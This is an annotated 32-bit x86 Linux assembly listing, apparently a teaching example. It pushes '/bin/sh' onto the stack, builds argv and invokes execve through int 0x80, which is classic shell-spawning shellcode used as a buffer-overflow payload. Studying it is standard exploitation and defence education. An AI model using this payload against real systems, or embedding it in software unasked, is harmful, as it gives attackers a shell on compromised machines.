# create null
xor edx, edx

# put a null terminated string of /bin/sh on the stack
push edx
push 0x68732f2f
push 0x6e69622f

# Get a pointer to the string on the stack
mov ebx, esp

# Create argv that will be the second argument that will be passed to execve()
# null terminated
push edx
# argv[0] is by convention is a pointer to the name of the executable
push ebx 

# get a pointer to the argv array constructed above
mov ecx, esp

# Note: ebx is the first argument to execve()
# Note: ecx is the second argument to execve()
# Note: edx is null and the third argument to execve()

# syscall number for execve()
mov eax, 0xb
int 0x80
